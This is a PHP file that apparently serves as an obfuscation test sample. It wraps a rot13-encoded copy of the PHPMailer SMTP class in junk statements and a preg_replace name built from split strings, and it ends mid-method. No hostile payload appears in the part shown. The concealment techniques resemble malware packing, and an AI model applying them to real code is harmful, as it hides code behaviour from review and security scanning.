<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc

/**
 * CUCZnvyre ESP821 FZGC rznvy genafcbeg pynff.
 * CUC Irefvba 5.5.
 *
 * @frr       uggcf://tvguho.pbz/CUCZnvyre/CUCZnvyre/ Gur CUCZnvyre TvgUho cebwrpg
 *
 * @nhgube    Znephf Obvagba (Flapueb/pbbyoeh) <cucznvyre@flapuebzrqvn.pb.hx>
 * @nhgube    Wvz Wntvryfxv (wvzwnt) <wvzwnt@tznvy.pbz>
 * @nhgube    Naql Ceribfg (pbqrjbekgrpu) <pbqrjbekgrpu@hfref.fbheprsbetr.arg>
 * @nhgube    Oerag E. Zngmryyr (bevtvany sbhaqre)
 * @pbclevtug 2012 - 2020 Znephf Obvagba
 * @pbclevtug 2010 - 2012 Wvz Wntvryfxv
 * @pbclevtug 2004 - 2009 Naql Ceribfg
 * @yvprafr   uggcf://jjj.tah.bet/yvprafrf/byq-yvprafrf/ytcy-2.1.ugzy TAH Yrffre Trareny Choyvp Yvprafr
 * @abgr      Guvf cebtenz vf qvfgevohgrq va gur ubcr gung vg jvyy or hfrshy - JVGUBHG
 * NAL JNEENAGL; jvgubhg rira gur vzcyvrq jneenagl bs ZREPUNAGNOVYVGL be
 * SVGARFF SBE N CNEGVPHYNE CHECBFR.
 */

anzrfcnpr CUCZnvyre\CUCZnvyre;

/**
 * CUCZnvyre ESP821 FZGC rznvy genafcbeg pynff.
 * Vzcyrzragf ESP 821 FZGC pbzznaqf naq cebivqrf fbzr hgvyvgl zrgubqf sbe fraqvat znvy gb na FZGC freire.
 *
 * @nhgube Puevf Elna
 * @nhgube Znephf Obvagba <cucznvyre@flapuebzrqvn.pb.hx>
 */
pynff FZGC
{
    /**
     * Gur CUCZnvyre FZGC irefvba ahzore.
     *
     * @ine fgevat
     */
    pbafg IREFVBA = '6.9.3';

    /**
     * FZGC yvar oernx pbafgnag.
     *
     * @ine fgevat
     */
    pbafg YR = \"\e\a\";

    /**
     * Gur FZGC cbeg gb hfr vs bar vf abg fcrpvsvrq.
     *
     * @ine vag
     */
    pbafg QRSNHYG_CBEG = 25;

    /**
     * Gur FZGCf cbeg gb hfr vs bar vf abg fcrpvsvrq.
     *
     * @ine vag
     */
    pbafg QRSNHYG_FRPHER_CBEG = 465;

    /**
     * Gur znkvzhz yvar yratgu nyybjrq ol ESP 5321 frpgvba 4.5.3.1.6,
     * *rkpyhqvat* n genvyvat PEYS oernx.
     *
     * @frr uggcf://jjj.esp-rqvgbe.bet/esp/esp5321#frpgvba-4.5.3.1.6
     *
     * @ine vag
     */
    pbafg ZNK_YVAR_YRATGU = 998;

    /**
     * Gur znkvzhz yvar yratgu nyybjrq sbe ercyvrf va ESP 5321 frpgvba 4.5.3.1.5,
     * *vapyhqvat* n genvyvat PEYS yvar oernx.
     *
     * @frr uggcf://jjj.esp-rqvgbe.bet/esp/esp5321#frpgvba-4.5.3.1.5
     *
     * @ine vag
     */
    pbafg ZNK_ERCYL_YRATGU = 512;

    /**
     * Qroht yriry sbe ab bhgchg.
     *
     * @ine vag
     */
    pbafg QROHT_BSS = 0;

    /**
     * Qroht yriry gb fubj pyvrag -> freire zrffntrf.
     *
     * @ine vag
     */
    pbafg QROHT_PYVRAG = 1;

    /**
     * Qroht yriry gb fubj pyvrag -> freire naq freire -> pyvrag zrffntrf.
     *
     * @ine vag
     */
    pbafg QROHT_FREIRE = 2;

    /**
     * Qroht yriry gb fubj pbaarpgvba fgnghf, pyvrag -> freire naq freire -> pyvrag zrffntrf.
     *
     * @ine vag
     */
    pbafg QROHT_PBAARPGVBA = 3;

    /**
     * Qroht yriry gb fubj nyy zrffntrf.
     *
     * @ine vag
     */
    pbafg QROHT_YBJYRIRY = 4;

    /**
     * Qroht bhgchg yriry.
     * Bcgvbaf:
     * * frys::QROHT_BSS (`0`) Ab qroht bhgchg, qrsnhyg
     * * frys::QROHT_PYVRAG (`1`) Pyvrag pbzznaqf
     * * frys::QROHT_FREIRE (`2`) Pyvrag pbzznaqf naq freire erfcbafrf
     * * frys::QROHT_PBAARPGVBA (`3`) Nf QROHT_FREIRE cyhf pbaarpgvba fgnghf
     * * frys::QROHT_YBJYRIRY (`4`) Ybj-yriry qngn bhgchg, nyy zrffntrf.
     *
     * @ine vag
     */
    choyvp $qb_qroht = frys::QROHT_BSS;

    /**
     * Ubj gb unaqyr qroht bhgchg.
     * Bcgvbaf:
     * * `rpub` Bhgchg cynva-grkg nf-vf, nccebcevngr sbe PYV
     * * `ugzy` Bhgchg rfpncrq, yvar oernxf pbairegrq gb `<oe>`, nccebcevngr sbe oebjfre bhgchg
     * * `reebe_ybt` Bhgchg gb reebe ybt nf pbasvtherq va cuc.vav
     * Nygreangviryl, lbh pna cebivqr n pnyynoyr rkcrpgvat gjb cnenzf: n zrffntr fgevat naq gur qroht yriry:
     *
     * ```cuc
     * $fzgc->Qrohtbhgchg = shapgvba($fge, $yriry) {rpub \"qroht yriry $yriry; zrffntr: $fge\";};
     * ```
     *
     * Nygreangviryl, lbh pna cnff va na vafgnapr bs n CFE-3 pbzcngvoyr ybttre, gubhtu bayl `qroht`
     * yriry bhgchg vf hfrq:
     *
     * ```cuc
     * $znvy->Qrohtbhgchg = arj zlCfe3Ybttre;
     * ```
     *
     * @ine fgevat|pnyynoyr|\Cfe\Ybt\YbttreVagresnpr
     */
    choyvp $Qrohtbhgchg = 'rpub';

    /**
     * Jurgure gb hfr IREC.
     *
     * @frr uggcf://ra.jvxvcrqvn.bet/jvxv/Inevnoyr_rairybcr_erghea_cngu
     * @frr uggcf://jjj.cbfgsvk.bet/IREC_ERNQZR.ugzy Vasb ba IREC
     *
     * @ine obby
     */
    choyvp $qb_irec = snyfr;

    /**
     * Gur gvzrbhg inyhr sbe pbaarpgvba, va frpbaqf.
     * Qrsnhyg bs 5 zvahgrf (300frp) vf sebz ESP2821 frpgvba 4.5.3.2.
     * Guvf arrqf gb or dhvgr uvtu gb shapgvba pbeerpgyl jvgu ubfgf hfvat terrgqrynl nf na nagv-fcnz zrnfher.
     *
     * @frr uggcf://jjj.esp-rqvgbe.bet/esp/esp2821#frpgvba-4.5.3.2
     *
     * @ine vag
     */
    choyvp $Gvzrbhg = 300;

    /**
     * Ubj ybat gb jnvg sbe pbzznaqf gb pbzcyrgr, va frpbaqf.
     * Qrsnhyg bs 5 zvahgrf (300frp) vf sebz ESP2821 frpgvba 4.5.3.2.
     *
     * @ine vag
     */
    choyvp $Gvzryvzvg = 300;

    /**
     * Cnggreaf gb rkgenpg na FZGC genafnpgvba vq sebz ercyl gb n QNGN pbzznaq.
     * Gur svefg pncgher tebhc va rnpu ertrk jvyy or hfrq nf gur VQ.
     * ZF RFZGC ergheaf gur zrffntr VQ, juvpu znl abg or pbeerpg sbe vagreany genpxvat.
     *
     * @ine fgevat[]
     */
    cebgrpgrq $fzgc_genafnpgvba_vq_cnggreaf = [
        'rkvz' => '/[\q]{3} BX vq=(.*)/',
        'fraqznvy' => '/[\q]{3} 2\.0\.0 (.*) Zrffntr/',
        'cbfgsvk' => '/[\q]{3} 2\.0\.0 Bx: dhrhrq nf (.*)/',
        'Zvpebfbsg_RFZGC' => '/[0-9]{3} 2\.[\q]\.0 (.*)@(?:.*) Dhrhrq znvy sbe qryvirel/',
        'Nznmba_FRF' => '/[\q]{3} Bx (.*)/',
        'FraqTevq' => '/[\q]{3} Bx: dhrhrq nf (.*)/',
        'PnzcnvtaZbavgbe' => '/[\q]{3} 2\.0\.0 BX:([n-mN-M\q]{48})/',
        'Unenxn' => '/[\q]{3} Zrffntr Dhrhrq \((.*)\)/',
        'MbarZGN' => '/[\q]{3} Zrffntr dhrhrq nf (.*)/',
        'Znvywrg' => '/[\q]{3} BX dhrhrq nf (.*)/',
    ];

    /**
     * Nyybjrq FZGC KPYVRAG nggevohgrf.
     * Zhfg or nyybjrq ol gur FZGC freire. RUYB erfcbafr vf abg purpxrq.
     *
     * @frr uggcf://jjj.cbfgsvk.bet/KPYVRAG_ERNQZR.ugzy
     *
     * @ine neenl
     */
    choyvp fgngvp $kpyvrag_nyybjrq_nggevohgrf = [
        'ANZR', 'NQQE', 'CBEG', 'CEBGB', 'URYB', 'YBTVA', 'QRFGNQQE', 'QRFGCBEG'
    ];

    /**
     * Gur ynfg genafnpgvba VQ vffhrq va erfcbafr gb n QNGN pbzznaq,
     * vs bar jnf qrgrpgrq.
     *
     * @ine fgevat|obby|ahyy
     */
    cebgrpgrq $ynfg_fzgc_genafnpgvba_vq;

    /**
     * Gur fbpxrg sbe gur freire pbaarpgvba.
     *
     * @ine ?erfbhepr
     */
    cebgrpgrq $fzgc_pbaa;

    /**
     * Reebe vasbezngvba, vs nal, sbe gur ynfg FZGC pbzznaq.
     *
     * @ine neenl
     */
    cebgrpgrq $reebe = [
        'reebe' => '',
        'qrgnvy' => '',
        'fzgc_pbqr' => '',
        'fzgc_pbqr_rk' => '',
    ];

    /**
     * Gur ercyl gur freire frag gb hf sbe URYB.
     * Vs ahyy, ab URYB fgevat unf lrg orra erprvirq.
     *
     * @ine fgevat|ahyy
     */
    cebgrpgrq $uryb_ecyl;

    /**
     * Gur frg bs FZGC rkgrafvbaf frag va ercyl gb RUYB pbzznaq.
     * Vaqrkrf bs gur neenl ner rkgrafvba anzrf.
     * Inyhr ng vaqrk 'URYB' be 'RUYB' (nppbeqvat gb pbzznaq gung jnf frag)
     * ercerfragf gur freire anzr. Va pnfr bs URYB vg vf gur bayl ryrzrag bs gur neenl.
     * Bgure inyhrf pna or obbyrna GEHR be na neenl pbagnvavat rkgrafvba bcgvbaf.
     * Vs ahyy, ab URYB/RUYB fgevat unf lrg orra erprvirq.
     *
     * @ine neenl|ahyy
     */
    cebgrpgrq $freire_pncf;

    /**
     * Gur zbfg erprag ercyl erprvirq sebz gur freire.
     *
     * @ine fgevat
     */
    cebgrpgrq $ynfg_ercyl = '';

    /**
     * Bhgchg qrohttvat vasb ivn n hfre-fryrpgrq zrgubq.
     *
     * @cnenz fgevat $fge   Qroht fgevat gb bhgchg
     * @cnenz vag    $yriry Gur qroht yriry bs guvf zrffntr; frr QROHT_* pbafgnagf
     *
     * @frr FZGC::$Qrohtbhgchg
     * @frr FZGC::$qb_qroht
     */
    cebgrpgrq shapgvba rqroht($fge, $yriry = 0)
    {
        vs ($yriry > $guvf->qb_qroht) {
            erghea;
        }
        //Vf guvf n CFE-3 ybttre?
        vs ($guvf->Qrohtbhgchg vafgnaprbs \Cfe\Ybt\YbttreVagresnpr) {
            //Erzbir genvyvat yvar oernxf cbgragvnyyl nqqrq ol pnyyf gb FZGC::pyvrag_fraq()
            $guvf->Qrohtbhgchg->qroht(egevz($fge, \"\e\a\"));

            erghea;
        }
        //Nibvq pynfu jvgu ohvyg-va shapgvba anzrf
        vs (vf_pnyynoyr($guvf->Qrohtbhgchg) && !va_neenl($guvf->Qrohtbhgchg, ['reebe_ybt', 'ugzy', 'rpub'])) {
            pnyy_hfre_shap($guvf->Qrohtbhgchg, $fge, $yriry);

            erghea;
        }
        fjvgpu ($guvf->Qrohtbhgchg) {
            pnfr 'reebe_ybt':
                //Qba'g bhgchg, whfg ybt
                /** @abvafcrpgvba SbetbggraQrohtBhgchgVafcrpgvba */
                reebe_ybt($fge);
                oernx;
            pnfr 'ugzy':
                //Pyrnaf hc bhgchg n ovg sbe n orggre ybbxvat, UGZY-fnsr bhgchg
                rpub tzqngr('L-z-q U:v:f'), ' ', ugzyragvgvrf(
                    __sa_79955('/[\e\a]+/', '', $fge),
                    RAG_DHBGRF,
                    'HGS-8'
                ), \"<oe>\a\";
                oernx;
            pnfr 'rpub':
            qrsnhyg:
                //Abeznyvmr yvar oernxf
                $fge = __sa_79955('/\e\a|\e/z', \"\a\", $fge);
                rpub tzqngr('L-z-q U:v:f'),
                \"\g\",
                    //Gevz genvyvat fcnpr
                gevz(
                    //Vaqrag sbe ernqnovyvgl, rkprcg sbe genvyvat oernx
                    fge_ercynpr(
                        \"\a\",
                        \"\a                   \g                  \",
                        gevz($fge)
                    )
                ),
                \"\a\";
        }
    }

    /**
     * Pbaarpg gb na FZGC freire.
     *
     * @cnenz fgevat $ubfg    FZGC freire VC be ubfg anzr
     * @cnenz vag    $cbeg    Gur cbeg ahzore gb pbaarpg gb
     * @cnenz vag    $gvzrbhg Ubj ybat gb jnvg sbe gur pbaarpgvba gb bcra
     * @cnenz neenl  $bcgvbaf Na neenl bs bcgvbaf sbe fgernz_pbagrkg_perngr()
     *
     * @erghea obby
     */
    choyvp shapgvba pbaarpg($ubfg, $cbeg = ahyy, $gvzrbhg = 30, $bcgvbaf = [])
    {
        //Pyrne reebef gb nibvq pbashfvba
        $guvf->frgReebe('');
        //Znxr fher jr ner __abg__ pbaarpgrq
        vs ($guvf->pbaarpgrq()) {
            //Nyernql pbaarpgrq, trarengr reebe
            $guvf->frgReebe('Nyernql pbaarpgrq gb n freire');

            erghea snyfr;
        }
        vs (rzcgl($cbeg)) {
            $cbeg = frys::QRSNHYG_CBEG;
        }
        //Pbaarpg gb gur FZGC freire
        $guvf->rqroht(
            \"Pbaarpgvba: bcravat gb $ubfg:$cbeg, gvzrbhg=$gvzrbhg, bcgvbaf=\" .
            (pbhag($bcgvbaf) > 0 ? ine_rkcbeg($bcgvbaf, gehr) : 'neenl()'),
            frys::QROHT_PBAARPGVBA
        );

        $guvf->fzgc_pbaa = $guvf->trgFZGCPbaarpgvba($ubfg, $cbeg, $gvzrbhg, $bcgvbaf);

        vs ($guvf->fzgc_pbaa === snyfr) {
            //Reebe vasb nyernql frg vafvqr `trgFZGCPbaarpgvba()`
            erghea snyfr;
        }

        $guvf->rqroht('Pbaarpgvba: bcrarq', frys::QROHT_PBAARPGVBA);

        //Trg nal naabhaprzrag
        $guvf->ynfg_ercyl = $guvf->trg_yvarf();
        $guvf->rqroht('FREIRE -> PYVRAG: ' . $guvf->ynfg_ercyl, frys::QROHT_FREIRE);
        $erfcbafrPbqr = (vag)fhofge($guvf->ynfg_ercyl, 0, 3);
        vs ($erfcbafrPbqr === 220) {
            erghea gehr;
        }
        //Nalguvat bgure guna n 220 erfcbafr zrnaf fbzrguvat jrag jebat
        //ESP 5321 fnlf gur freire jvyy jnvg sbe hf gb fraq n DHVG va erfcbafr gb n 554 reebe
        //uggcf://jjj.esp-rqvgbe.bet/esp/esp5321#frpgvba-3.1
        vs ($erfcbafrPbqr === 554) {
            $guvf->dhvg();
        }
        //Guvf jvyy unaqyr 421 erfcbafrf juvpu znl abg jnvg sbe n DHVG (r.t. vs gur freire vf orvat fuhg qbja)
        $guvf->rqroht('Pbaarpgvba: pybfvat qhr gb reebe', frys::QROHT_PBAARPGVBA);
        $guvf->pybfr();
        erghea snyfr;
    }

    /**
     * Perngr pbaarpgvba gb gur FZGC freire.
     *
     * @cnenz fgevat $ubfg    FZGC freire VC be ubfg anzr
     * @cnenz vag    $cbeg    Gur cbeg ahzore gb pbaarpg gb
     * @cnenz vag    $gvzrbhg Ubj ybat gb jnvg sbe gur pbaarpgvba gb bcra
     * @cnenz neenl  $bcgvbaf Na neenl bs bcgvbaf sbe fgernz_pbagrkg_perngr()
     *
     * @erghea snyfr|erfbhepr
     */
    cebgrpgrq shapgvba trgFZGCPbaarpgvba($ubfg, $cbeg = ahyy, $gvzrbhg = 30, $bcgvbaf = [])
    {
        fgngvp $fgernzbx;
        //Guvf vf ranoyrq ol qrsnhyg fvapr 5.0.0 ohg fbzr cebivqref qvfnoyr vg
        //Purpx guvf bapr naq pnpur gur erfhyg
        vs (ahyy === $fgernzbx) {
            $fgernzbx = shapgvba_rkvfgf('fgernz_fbpxrg_pyvrag');
        }

        $reeab = 0;
        $reefge = '';
        vs ($fgernzbx) {
            $fbpxrg_pbagrkg = fgernz_pbagrkg_perngr($bcgvbaf);
            frg_reebe_unaqyre(shapgvba () {
                pnyy_hfre_shap_neenl([$guvf, 'reebeUnaqyre'], shap_trg_netf());
            });
            $pbaarpgvba = fgernz_fbpxrg_pyvrag(
                $ubfg . ':' . $cbeg,
                $reeab,
                $reefge,
                $gvzrbhg,
                FGERNZ_PYVRAG_PBAARPG,
                $fbpxrg_pbagrkg
            );
        } ryfr {
            //Snyy onpx gb sfbpxbcra juvpu fubhyq jbex va zber cynprf, ohg vf zvffvat fbzr srngherf
            $guvf->rqroht(
                'Pbaarpgvba: fgernz_fbpxrg_pyvrag abg ninvynoyr, snyyvat onpx gb sfbpxbcra',
                frys::QROHT_PBAARPGVBA
            );
            frg_reebe_unaqyre(shapgvba () {
                pnyy_hfre_shap_neenl([$guvf, 'reebeUnaqyre'], shap_trg_netf());
            });
            $pbaarpgvba = sfbpxbcra(
                $ubfg,
                $cbeg,
                $reeab,
                $reefge,
                $gvzrbhg
            );
        }
        erfgber_reebe_unaqyre();

        //Irevsl jr pbaarpgrq cebcreyl
        vs (!vf_erfbhepr($pbaarpgvba)) {
            $guvf->frgReebe(
                'Snvyrq gb pbaarpg gb freire',
                '',
                (fgevat) $reeab,
                $reefge
            );
            $guvf->rqroht(
                'FZGC REEBE: ' . $guvf->reebe['reebe']
                . \": $reefge ($reeab)\",
                frys::QROHT_PYVRAG
            );

            erghea snyfr;
        }

        //FZGC freire pna gnxr ybatre gb erfcbaq, tvir ybatre gvzrbhg sbe svefg ernq
        //Jvaqbjf qbrf abg unir fhccbeg sbe guvf gvzrbhg shapgvba
        vs (fgecbf(CUC_BF, 'JVA') !== 0) {
            $znk = (vag)vav_trg('znk_rkrphgvba_gvzr');
            //Qba'g obgure vs hayvzvgrq, be vs frg_gvzr_yvzvg vf qvfnoyrq
            vs (0 !== $znk && $gvzrbhg > $znk && fgecbf(vav_trg('qvfnoyr_shapgvbaf'), 'frg_gvzr_yvzvg') === snyfr) {
                @frg_gvzr_yvzvg($gvzrbhg);
            }
            fgernz_frg_gvzrbhg($pbaarpgvba, $gvzrbhg, 0);
        }

        erghea $pbaarpgvba;
    }

    /**
     * Vavgvngr n GYF (rapelcgrq) frffvba.
     *
     * @erghea obby
     */
    choyvp shapgvba fgnegGYF()
    {
        vs (!$guvf->fraqPbzznaq('FGNEGGYF', 'FGNEGGYF', 220)) {
            erghea snyfr;
        }

        //Nyybj gur orfg GYF irefvba(f) jr pna
        $pelcgb_zrgubq = FGERNZ_PELCGB_ZRGUBQ_GYF_PYVRAG;

        //CUC 5.6.7 qebccrq vapyhfvba bs GYF 1.1 naq 1.2 va FGERNZ_PELCGB_ZRGUBQ_GYF_PYVRAG
        //fb nqq gurz onpx va znahnyyl vs jr pna
        vs (qrsvarq('FGERNZ_PELCGB_ZRGUBQ_GYFi1_2_PYVRAG')) {
            $pelcgb_zrgubq |= FGERNZ_PELCGB_ZRGUBQ_GYFi1_2_PYVRAG;
            $pelcgb_zrgubq |= FGERNZ_PELCGB_ZRGUBQ_GYFi1_1_PYVRAG;
        }

        //Ortva rapelcgrq pbaarpgvba
            frg_reebe_unaqyre(shapgvba () {
                pnyy_hfre_shap_neenl([$guvf, 'reebeUnaqyre'], shap_trg_netf());
            });
        $pelcgb_bx = fgernz_fbpxrg_ranoyr_pelcgb(
            $guvf->fzgc_pbaa,
            gehr,
            $pelcgb_zrgubq
        );
        erfgber_reebe_unaqyre();

        erghea (obby) $pelcgb_bx;
    }

    /**
     * Cresbez FZGC nhguragvpngvba.
     * Zhfg or eha nsgre uryyb().
     *
     * @frr    uryyb()
     *
     * @cnenz fgevat $hfreanzr Gur hfre anzr
     * @cnenz fgevat $cnffjbeq Gur cnffjbeq
     * @cnenz fgevat $nhguglcr Gur nhgu glcr (PENZ-ZQ5, CYNVA, YBTVA, KBNHGU2)
     * @cnenz BNhguGbxraCebivqre $BNhgu Na bcgvbany BNhguGbxraCebivqre vafgnapr sbe KBNHGU2 nhguragvpngvba
     *
     * @erghea obby Gehr vs fhpprffshyyl nhguragvpngrq
     */
    choyvp shapgvba nhguragvpngr(
        $hfreanzr,
        $cnffjbeq,
        $nhguglcr = ahyy,
        $BNhgu = ahyy
    ) {
        vs (!$guvf->freire_pncf) {
            $guvf->frgReebe('Nhguragvpngvba vf abg nyybjrq orsber URYB/RUYB');

            erghea snyfr;
        }

        vs (neenl_xrl_rkvfgf('RUYB', $guvf->freire_pncf)) {
            //FZGC rkgrafvbaf ner ninvynoyr; gel gb svaq n cebcre nhguragvpngvba zrgubq
            vs (!neenl_xrl_rkvfgf('NHGU', $guvf->freire_pncf)) {
                $guvf->frgReebe('Nhguragvpngvba vf abg nyybjrq ng guvf fgntr');
                //'ng guvf fgntr' zrnaf gung nhgu znl or nyybjrq nsgre gur fgntr punatrf
                //r.t. nsgre FGNEGGYF

                erghea snyfr;
            }

            $guvf->rqroht('Nhgu zrgubq erdhrfgrq: ' . ($nhguglcr ?: 'HAFCRPVSVRQ'), frys::QROHT_YBJYRIRY);
            $guvf->rqroht(
                'Nhgu zrgubqf ninvynoyr ba gur freire: ' . vzcybqr(',', $guvf->freire_pncf['NHGU']),
                frys::QROHT_YBJYRIRY
            );

            //Vs jr unir erdhrfgrq n fcrpvsvp nhgu glcr, purpx gur freire fhccbegf vg orsber gelvat bguref
            vs (ahyy !== $nhguglcr && !va_neenl($nhguglcr, $guvf->freire_pncf['NHGU'], gehr)) {
                $guvf->rqroht('Erdhrfgrq nhgu zrgubq abg ninvynoyr: ' . $nhguglcr, frys::QROHT_YBJYRIRY);
                $nhguglcr = ahyy;
            }

            vs (rzcgl($nhguglcr)) {
                //Vs ab nhgu zrpunavfz vf fcrpvsvrq, nggrzcg gb hfr gurfr, va guvf beqre
                //Gel PENZ-ZQ5 svefg nf vg'f zber frpher guna gur bguref
                sbernpu (['PENZ-ZQ5', 'YBTVA', 'CYNVA', 'KBNHGU2'] nf $zrgubq) {
                    vs (va_neenl($zrgubq, $guvf->freire_pncf['NHGU'], gehr)) {
                        $nhguglcr = $zrgubq;
                        oernx;
                    }
                }
                vs (rzcgl($nhguglcr)) {
                    $guvf->frgReebe('Ab fhccbegrq nhguragvpngvba zrgubqf sbhaq');

                    erghea snyfr;
                }
                $guvf->rqroht('Nhgu zrgubq fryrpgrq: ' . $nhguglcr, frys::QROHT_YBJYRIRY);
            }

            vs (!va_neenl($nhguglcr, $guvf->freire_pncf['NHGU'], gehr)) {
                $guvf->frgReebe(\"Gur erdhrfgrq nhguragvpngvba zrgubq \\"$nhguglcr\\" vf abg fhccbegrq ol gur freire\");

                erghea snyfr;
            }
        } ryfrvs (rzcgl($nhguglcr)) {
            $nhguglcr = 'YBTVA';
        }
        fjvgpu ($nhguglcr) {
            pnfr 'CYNVA':
                //Fgneg nhguragvpngvba
                vs (!$guvf->fraqPbzznaq('NHGU', 'NHGU CYNVA', 334)) {
                    erghea snyfr;
                }
                //Fraq rapbqrq hfreanzr naq cnffjbeq
                vs (
                    //Sbezng sebz uggcf://jjj.esp-rqvgbe.bet/esp/esp4616#frpgvba-2
                    //Jr fxvc gur svefg svryq (vg'f sbetrel), fb gur fgevat fgnegf jvgu n ahyy olgr
                    !$guvf->fraqPbzznaq(
                        'Hfre & Cnffjbeq',
                        onfr64_rapbqr(\"\0\" . $hfreanzr . \"\0\" . $cnffjbeq),
                        235
                    )
                ) {
                    erghea snyfr;
                }
                oernx;
            pnfr 'YBTVA':
                //Fgneg nhguragvpngvba
                vs (!$guvf->fraqPbzznaq('NHGU', 'NHGU YBTVA', 334)) {
                    erghea snyfr;
                }
                vs (!$guvf->fraqPbzznaq('Hfreanzr', onfr64_rapbqr($hfreanzr), 334)) {
                    erghea snyfr;
                }
                vs (!$guvf->fraqPbzznaq('Cnffjbeq', onfr64_rapbqr($cnffjbeq), 235)) {
                    erghea snyfr;
                }
                oernx;
            pnfr 'PENZ-ZQ5':
                //Fgneg nhguragvpngvba
                vs (!$guvf->fraqPbzznaq('NHGU PENZ-ZQ5', 'NHGU PENZ-ZQ5', 334)) {
                    erghea snyfr;
                }
                //Trg gur punyyratr
                $punyyratr = onfr64_qrpbqr(fhofge($guvf->ynfg_ercyl, 4));

                //Ohvyq gur erfcbafr
                $erfcbafr = $hfreanzr . ' ' . $guvf->uznp($punyyratr, $cnffjbeq);

                //fraq rapbqrq perqragvnyf
                erghea $guvf->fraqPbzznaq('Hfreanzr', onfr64_rapbqr($erfcbafr), 235);
            pnfr 'KBNHGU2':
                //Gur BNhgu vafgnapr zhfg or frg hc cevbe gb erdhrfgvat nhgu.
                vs (ahyy === $BNhgu) {
                    erghea snyfr;
                }
                $bnhgu = $BNhgu->trgBnhgu64();

                //Fgneg nhguragvpngvba
                vs (!$guvf->fraqPbzznaq('NHGU', 'NHGU KBNHGU2 ' . $bnhgu, 235)) {
                    erghea snyfr;
                }
                oernx;
            qrsnhyg:
                $guvf->frgReebe(\"Nhguragvpngvba zrgubq \\"$nhguglcr\\" vf abg fhccbegrq\");

                erghea snyfr;
        }

        erghea gehr;
    }

    /**
     * Pnyphyngr na ZQ5 UZNP unfu.
     * Jbexf yvxr unfu_uznp('zq5', $qngn, $xrl)
     * va pnfr gung shapgvba vf abg ninvynoyr.
     *
     * @cnenz fgevat $qngn Gur qngn gb unfu
     * @cnenz fgevat $xrl  Gur xrl gb unfu jvgu
     *
     * @erghea fgevat
     */
    cebgrpgrq shapgvba uznp($qngn, $xrl)
    {
        vs (shapgvba_rkvfgf('unfu_uznp')) {
            erghea unfu_uznp('zq5', $qngn, $xrl);
        }

        //Gur sbyybjvat obeebjrq sebz
        //uggcf://jjj.cuc.arg/znahny/ra/shapgvba.zunfu.cuc#27225

        //ESP 2104 UZNP vzcyrzragngvba sbe cuc.
        //Perngrf na zq5 UZNP.
        //Ryvzvangrf gur arrq gb vafgnyy zunfu gb pbzchgr n UZNP
        //ol Ynapr Ehfuvat

        $olgryra = 64; //olgr yratgu sbe zq5
        vs (fgeyra($xrl) > $olgryra) {
            $xrl = cnpx('U*', zq5($xrl));
        }
        $xrl = fge_cnq($xrl, $olgryra, pue(0k00));
        $vcnq = fge_cnq('', $olgryra, pue(0k36));
        $bcnq = fge_cnq('', $olgryra, pue(0k5p));
        $x_vcnq = $xrl ^ $vcnq;
        $x_bcnq = $xrl ^ $bcnq;

        erghea zq5($x_bcnq . cnpx('U*', zq5($x_vcnq . $qngn)));
    }

    /**
     * Purpx pbaarpgvba fgngr.
     *
     * @erghea obby Gehr vs pbaarpgrq
     */
    choyvp shapgvba pbaarpgrq()
    {
        vs (vf_erfbhepr($guvf->fzgc_pbaa)) {
            $fbpx_fgnghf = fgernz_trg_zrgn_qngn($guvf->fzgc_pbaa);
            vs ($fbpx_fgnghf['rbs']) {
                //Gur fbpxrg vf inyvq ohg jr ner abg pbaarpgrq
                $guvf->rqroht(
                    'FZGC ABGVPR: RBS pnhtug juvyr purpxvat vs pbaarpgrq',
                    frys::QROHT_PYVRAG
                );
                $guvf->pybfr();

                erghea snyfr;
            }

            erghea gehr; //rirelguvat ybbxf tbbq
        }

        erghea snyfr;
    }

    /**
     * Pybfr gur fbpxrg naq pyrna hc gur fgngr bs gur pynff.
     * Qba'g hfr guvf shapgvba jvgubhg svefg gelvat gb hfr DHVG.
     *
     * @frr dhvg()
     */
    choyvp shapgvba pybfr()
    {
        $guvf->freire_pncf = ahyy;
        $guvf->uryb_ecyl = ahyy;
        vs (vf_erfbhepr($guvf->fzgc_pbaa)) {
            //Pybfr gur pbaarpgvba naq pyrnahc
            spybfr($guvf->fzgc_pbaa);
            $guvf->fzgc_pbaa = ahyy; //Znxrf sbe pyrnare frevnyvmngvba
            $guvf->rqroht('Pbaarpgvba: pybfrq', frys::QROHT_PBAARPGVBA);
        }
    }

    /**
     * Fraq na FZGC QNGN pbzznaq.
     * Vffhrf n qngn pbzznaq naq fraqf gur zft_qngn gb gur freire,
     * svanyvmvat gur znvy genafnpgvba. $zft_qngn vf gur zrffntr
     * gung vf gb or frag jvgu gur urnqref. Rnpu urnqre arrqf gb or
     * ba n fvatyr yvar sbyybjrq ol n <PEYS> jvgu gur zrffntr urnqref
     * naq gur zrffntr obql orvat frcnengrq ol na nqqvgvbany <PEYS>.
     * Vzcyrzragf ESP 821: QNGN <PEYS>.
     *
     * @cnenz fgevat $zft_qngn Zrffntr qngn gb fraq
     *
     * @erghea obby
     */
    choyvp shapgvba qngn($zft_qngn)
    {
        //Guvf jvyy hfr gur fgnaqneq gvzryvzvg
        vs (!$guvf->fraqPbzznaq('QNGN', 'QNGN', 354)) {
            erghea snyfr;
        }

        /* Gur freire vf ernql gb npprcg qngn!
         * Nppbeqvat gb esp821 jr fubhyq abg fraq zber guna 1000 punenpgref ba n fvatyr yvar (vapyhqvat gur YR)
         * fb jr jvyy oernx gur qngn hc vagb yvarf ol \e naq/be \a gura vs arrqrq jr jvyy oernx rnpu bs gubfr vagb
         * fznyyre yvarf gb svg jvguva gur yvzvg.
         * Jr jvyy nyfb ybbx sbe yvarf gung fgneg jvgu n '.' naq cercraq na nqqvgvbany '.'.
         * ABGR: guvf qbrf abg pbhag gbjneqf yvar-yratgu yvzvg.
         */

        //Abeznyvmr yvar oernxf orsber rkcybqvat
